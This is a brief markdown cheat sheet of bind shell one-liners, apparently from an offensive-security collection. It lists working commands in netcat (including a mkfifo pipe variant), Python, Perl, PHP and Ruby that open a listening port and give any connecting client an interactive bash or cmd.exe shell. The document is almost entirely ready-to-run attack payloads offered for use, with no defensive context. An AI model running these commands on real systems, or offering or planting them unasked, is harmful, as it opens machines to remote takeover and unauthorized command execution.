# Bind Shell Cheet Sheet
A collection of bind shell. Bind Shell and Only Bind Shell "RS will be in another file"
will be add more later

## Netcat (netcat-traditional)
### linux
`nc -lvp 2222 -e /bin/bash`

### Windows
`nc.exe -nlvp 4444 -e cmd.exe`

### OpenBSD (netcat-openbsd)
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 2222 >/tmp/f`

## Python
`python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"`

## Perl
`perl -e 'use Socket;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'`

## PHP
`php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",2222);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'`

## Ruby
`ruby -rsocket -e 'f=TCPServer.new(2222);s=f.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",s,s,s)'`
